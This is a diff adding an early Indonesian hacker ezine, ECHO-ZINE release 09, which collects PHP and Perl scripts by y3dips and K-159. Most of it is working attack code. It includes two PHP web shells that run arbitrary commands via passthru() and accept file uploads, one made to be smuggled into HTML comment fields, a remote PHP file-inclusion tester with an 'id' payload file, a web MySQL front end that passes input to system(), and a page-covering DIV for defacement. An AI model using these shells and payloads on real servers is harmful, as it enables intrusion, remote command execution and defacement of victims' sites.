@@ -1,0 +1,518 @@
+
+
+      
+       - ____________________   ___ ___ ________   
+       --\_   _____/\_   ___ \ /   |   \\_____  \--
+	 -|    __)_ /    \  \//    ~    \/   |   \--
+	 -|        \\     \___\    Y    /    |    \--
+	-/_______  / \______  /\___|_  /\_______  /-
+	 -      -\/        -\/      -\/        -\/- 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE 09
+ 
+ Author: y3dips && K-159 
+ Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+== ECHO Skrapt 2004 ==
+
+01./Catet info browser dan IP >dot< php   ~[ y3dips ]
+02./Uplod File && $hell command via browser >dot< php    ~[ y3dips ]
+03.\General PHP injection Testing script >dot< perl    ~[ y3dips ]
+04.|MySQL management under web                ~[ K-159 ]
+05.\PHP upload file in HTML rulez..          ~[ K-159 ]
+06.\using DIV to manipulating all of the page area :) (*smart enough isnt it) ~[k-159 ]
+
+.: BEGIN
+ 
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+01. Skrip Untuk Mencatat IP dan INFO BROWSER
+
+By       : y3dips
+Language : PHP
+Resource : Buku php , from phpinfo(); (to get the variable)
+Published: http://geocities.com/y3d1ps/scrapt/catatip.php.txt
+Comment  : skrip ini dibuat dengan bahasa pemrograman PHP , pd awalnya di gunakan pada 
+           situs echo.or.id , untuk halaman index-nya
+
+
+/*----- snip -----
+           
+
+<html>
+<head>
+<title> catet info browser dan ip </title>
+ <?php
+   if($HTTP_VIA == "")
+  printf("<div align= center>%s ::
+  diakses dari<i><b> ip </b></i> <b>$REMOTE_ADDR</b><br> dengan <i><b> browser</b></i>
+  <b> $HTTP_USER_AGENT</b> </div>",date("D, d F Y"));
+ 
+  else
+  printf("<div align= center>%s :: 
+ </b> diakses dari<i><b> ip </b></i> <b>$HTTP_X_FORWARDED_FOR</b><br> dengan <i><b> browser</b></i> 
+ <b>$HTTP_USER_AGENT</B> melalui <b>$HTTP_VIA</b> dengan ip <i>$REMOTE_ADDR</i></div>",date("D, d F Y"));
+    ?>
+  </p>
+</body>
+</html>
+
+
+------- snip -----*/
+
+
+
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+
+
+02. Uplod File && $hell command via browser >dot< php    ~[ y3dips ]
+
+By       : y3dips
+Language : PHP
+Resource : .....PHP book, PHP manual <dot> chm
+Published: ....
+Comment  : skrip ini dibuat dengan bahasa pemrograman PHP , digunakan sebagai   halaman 
+           untuk mengupload file dan eksekusi $hell command via browser , dengan beberapa
+           settingan 'tertentu' yang di "allow" pada php.ini dan httpd.conf
+
+/*----- snip -----
+
+<!-- upload php shell made by y3dips (echo.or.id) for test only       -->
+<!-- greetz to K-159 ,the_day, z3r0byt3, m0by , comex, c-a-s-e , S'to -->
+<html>
+<head>
+<title>#E-C-H-O Upl0ad  $hell</title>
+</head>
+<BODY bgcolor="#000000">
+<!-- ngatur direktori -->
+<? if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); } ?>
+<table>
+<tr><td bgcolor=#cccccc>
+
+<!-- eksekusi command dengan passthru -->
+
+<?
+if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="ls -la ; pwd ;id "; }
+echo "<b>";
+echo "<div align=left><textarea name=report cols=70 rows=15>";
+echo "".passthru($_POST['cmd'])."";
+echo "</textarea></div>";
+echo "</b>";
+?>
+</td></tr></table>
+<!-- upload file -->
+<?
+if (($HTTP_POST_FILES["filenyo"]!=="") AND ($HTTP_POST_FILES["filenyo"]))
+{
+copy($HTTP_POST_FILES["filenyo"][tmp_name],
+$_POST['dir']."/".$HTTP_POST_FILES["filenyo"][name])
+or print("<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=arial>
+<div>file gak isa di uplod ".$HTTP_POST_FILES["filenyo"][name]."</div></font></td></tr></table>");
+}
+?>
+<table width=100% cellpadding=0 cellspacing=0 >
+<tr><td>
+
+<!-- form eksekusi command -->
+
+<?
+echo "<form name=command method=post>";
+echo "<font face=Verdana size=1 color=red>";
+echo "<b>[CmD ]</b><input type=text name=cmd size=33>  ";
+if ((!$_POST['dir']) OR ($_POST['dir']=="")) 
+{ echo " <b>[Dir]</b><input type=text name=dir size=40 value=".exec("pwd").">"; }
+else { echo "<input type=text name=dir size=40 value=".$_POST['dir'].">"; }
+echo "  <input type=submit name=submit value=\"0k\">";
+echo "</font>";
+echo "</form>";
+?>
+</td></tr></table>
+<table width=100% cellpadding=0 cellspacing=0 >
+
+<!-- form upload -->
+
+<?
+echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
+echo "<font face=Verdana size=1 color=red>";
+echo "<b> [EcHo]</b>";
+echo "<input type=file name=filenyo size=70> ";
+if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=70 value=".exec("pwd").">"; }
+else { echo "<input type=hidden name=dir size=70 value=".$_POST['dir'].">"; }
+echo "<input type=submit name=submit value=\"0k\">";
+echo "</font>";
+echo "</form>";
+?>
+</td></tr></table>
+</html>
+
+
+------- snip -----*/
+
+
+
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+
+03.\General PHP injection Testing script
+
+
+By       : y3dips
+Language : PeRl
+Resource : http://ezine.echo.or.id/ezine8/ez-r08-y3dips-becommunityeXplo.txt
+Published: ... in this ezine
+Comment  : Skrip ini dibuat untuk testing remote injection terhadap php vuln
+           sebenarnya untuk menggantikan fungsi browser , khususnya lagi dikembangkan
+           dengan menggunakan file sebagai database target *_^
+
+
+
+
+Petunjuk :
+
+ masukkan lengkap path target yang vulnerable sesuai vulnerablenya, misal :
+ $target = www.dudul.com/index.php?pageurl=
+
+ serta path lengkap exploit filenya (read about injection script in attacker side)
+ $xploit = www.keren.com/echo.txt
+
+
+ dan yang perlu dilakukan dalam inputan adalah
+ perl xplo.pl http://www.dudul.com/index.php?pageurl= www.keren.com/echo.txt
+
+
+/*----- snip -----
+
+# xplo.pl
+#!/usr/bin/perl -w 
+# Remote Testing PHP injection by y3dips [for testing only]
+
+print "  * Remote Testing PHP injection by y3dips *\n";
+
+require LWP::UserAgent;
+
+if(@ARGV == 2)
+	{
+      
+$target= $ARGV[0];   
+$xploit= $ARGV[1];   
+
+my $ua = LWP::UserAgent->new;
+$ua->agent("MSIE/6.0 Windows");
+$ua->timeout(10);
+$ua->env_proxy;
+
+$url = "http://$target$xploit";
+
+my $injek = $ua->get($url); 
+
+	print "---------------------------------------------------\n";
+
+	if ($injek->is_success) 
+		{ print ("    Sepertinya Vulnerable\n");       } 
+	else 	{ print ("    Sepertinya Tidak Vulnerable\n"); }
+
+	print "---------------------------------------------------\n";
+
+	}
+
+else{
+print "Gunakan: perl $0 [path vulnerable] [path xplo]  \n"; 
+}  
+
+
+
+=====================
+
+
+echo.txt
+
+
+-- cut --
+
+<?
+echo "".passthru(' id ')."";
+?>
+
+-- cut --
+
+------- snip -----*/
+
+
+
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+
+
+04.\MySQL management under web
+
+
+By       : k-159
+Language : Php
+Resource : ..., based on explorer 1.4 lost noobs
+Published: ... in this ezine
+Comment  : Manage SQL under web base
+
+
+/*----- snip -----
+
+
+<!-- sql remote injection script by K-159          -->
+<!-- @t http://aikmel.com en http://echo.or.id     -->
+<!-- based on explorer 1.4 lost noobs              -->
+
+<html>
+<head><title>.:You Landed on K-159 Project:.</title>
+<body bgcolor="blue">
+
+<?
+
+echo("
+<FORM ENCTYPE=\"multipart/form-data\"  METHOD=POST>
+<br><br><hr><br><br>
+
+Enter mysql client binary <br>
+<input name=\"sql_client\" type=\"text\" value=\"mysql\">
+
+<br><br>Enter the login<br>
+<input name=\"sql_login\" type=\"text\" value=\"root\">
+
+<br><br>Enter the password<br>
+<input name=\"sql_password\" type=\"text\" value=\"none\">
+
+<br><br>Enter address of target<br>
+<input name=\"sql_host\" type=\"text\" value=\"Provide a target\">
+
+<bR><br>Enter other port of mysql<br>
+<input name=\"sql_options\" type=\"text\" value=\"\">
+
+
+<br><br>Enter valid SQL queries<br>
+<TEXTAREA input name=\"sql_query\" ROWS=10 COLS=35>SHOW DATABASES;
+# USE database_name; SHOW TABLES;
+# SELECT * FROM table_name;</TEXTAREA>
+
+<br><br><input name=\"submit\" type=\"submit\" value=\"Send !\">
+<br><br><hr>
+</font></form>
+
+       ");
+
+
+if($sql_client)
+  {
+  if ($sql_host == "Provide a target") // This checks that a target is set
+     {
+     echo("Please provide a valid target."); // No target is set
+     }
+  else if($sql_password == "none") // Ok for target, processing if no password is set
+    {
+    $sql_exec_option = "--execute=\"$sql_query\"";
+    $system_cmd="$sql_client --user=$sql_login --host=$sql_host $sql_options $sql_exec_option";
+    $system_cmd=str_replace("\\\"","\"",$system_cmd);
+    $system_cmd=str_replace("\\'","'",$system_cmd);
+    echo("<br><br>Results for query : <b>$system_cmd</b> :<br><br><TEXTAREA COLS=100 ROWS=40>\"SQL query \"$sql_query\" results :
+------------------------------------------------------------
+
+");
+    system($system_cmd,$var);
+    if($var != 0){
+    system($system_cmd . " 1> /tmp/.output.txt 2>&1; cat /tmp/.output.txt rm /tmp/.output.txt"); }
+    echo("</TEXTAREA>");
+    }
+
+ else // processing when target is ok and when a password is provided
+    {
+    $sql_exec_option = "--execute=\"$sql_query\"";
+    $system_cmd="$sql_client --user=$sql_login --password=$sql_password --host=$sql_host $sql_options $sql_exec_option";
+    $system_cmd=str_replace("\\\"","\"",$system_cmd);
+    $system_cmd=str_replace("\\'","'",$system_cmd);
+    echo("<br><br>Results for query : <b>$system_cmd</b> :<br><br><TEXTAREA COLS=100 ROWS=40>\"SQL query \"$sql_query\" results :
+------------------------------------------------------------
+
+");
+    system($system_cmd,$var);
+    if($var != 0){
+    system($system_cmd . " 1> /tmp/.output.txt 2>&1; cat /tmp/.output.txt rm /tmp/.output.txt"); }
+    echo("</TEXTAREA>");
+    } // end of else
+   }
+
+?>
+</html>
+
+------- snip -----*/
+
+
+
+
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+
+
+05.\PHP upload file in HTML rulez..
+
+
+By       : k-159 
+Language : HTML
+Resource : ...,
+Published: ... in this ezine
+Comment  : skrip ini dibuat saat mencoba membuat upload skrip dengan menumpang di box (comment,
+           input) yang bisa hanya di inputkan html , but the server allow to execute php :)
+
+
+/*----- snip -----
+
+<html>
+<head>
+<title>K-159 Project</title>
+</head>
+<BODY bgcolor="#000000">
+
+
+<script language="php">
+if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); }
+</script>
+<table>
+<tr><td bgcolor=#cccccc>
+
+<script language="php">
+if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="ls -la ;uname -ar;pwd ;id;cat /etc/hosts "; }
+echo "<b>";
+echo "<div align=left><textarea name=report cols=70 rows=15>";
+echo "".passthru($_POST['cmd'])."";
+echo "</textarea></div>";
+echo "</b>";
+</script>
+</td></tr></table>
+
+<script language="php">
+if (($HTTP_POST_FILES["filenyo"]!=="") AND ($HTTP_POST_FILES["filenyo"]))
+{
+copy($HTTP_POST_FILES["filenyo"][tmp_name],
+$_POST['dir']."/".$HTTP_POST_FILES["filenyo"][name])
+or print("<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=arial>
+<div>file [ ".$HTTP_POST_FILES["filenyo"][name]." ] Error Cuk !!
+!!</div></font></td></tr></table>");
+}
+</script>
+<table width=100% cellpadding=0 cellspacing=0 >
+<tr><td>
+
+<script language="php">
+echo "<form name=command method=post>";
+echo "<font face=Verdana size=1 color=red>";
+echo "<b>[CmD ]</b><input type=text name=cmd size=33>  ";
+if ((!$_POST['dir']) OR ($_POST['dir']==""))
+{ echo " <b>[Dir]</b><input type=text name=dir size=40 value=".exec("pwd").">"; }
+else { echo "<input type=text name=dir size=40 value=".$_POST['dir'].">"; }
+echo "  <input type=submit name=submit value=\"0k\">";
+echo "</font>";
+echo "</form>";
+</script>
+</td></tr></table>
+<table width=100% cellpadding=0 cellspacing=0 >
+
+<script language="php">
+echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
+echo "<font face=Verdana size=1 color=red>";
+echo "<b> [EcHo]</b>";
+echo "<input type=file name=filenyo size=70> ";
+if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=70 value=".exec("pwd").">"; }
+else { echo "<input type=hidden name=dir size=70 value=".$_POST['dir'].">"; }
+echo "<input type=submit name=submit value=\"0k\">";
+echo "</font>";
+echo "</form>";
+</script>
+</td></tr></table>
+</html>
+------- snip -----*/
+
+
+
+
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+
+
+06.\using DIV to manipulating all of the page area :) (*smart enough isnt it? )
+
+
+By       : k-159
+Language : HTML
+Resource : ...,
+Published: ... in this ezine
+Comment  : skrip ini digunakan untuk menutupi seluruh skrip lainnya (dengan penggunaan DIV)
+
+
+Petunjuk : letakkan potongan skrip ini di atas kode " page anda " :D 
+
+
+/*----- snip -----
+
+<div id="Layer1" style="position:absolute; left:0; top:0; width:4000; height:4090;
+z-index:1; background-color: #000000; layer-background-color: #ccccc; border: 1px none #000000">
+
+------- snip -----*/
+
+
+
++++++       +++++++ + +++ +++++++++ ++++ +++++++ +++++ +++++ ++++++ +++++++++ ++++++++ +++++
+
+
+
+
+
+Disclamier:
+
+all script on this article for educational purpose, echo.or.id does not accept responsibility 
+for any damage or injury caused as a result of its use
+
+
+*greetz to: 
+	
+        anak anak newbie_hacker[at]yahoogroups.com , #e-c-h-o , #aikmel
+	all $ecurity Industry 1n INDONESIA
+
+	kirimkan kritik && saran ke echostaff[at]echo<dot>or<dot>id
+
+	
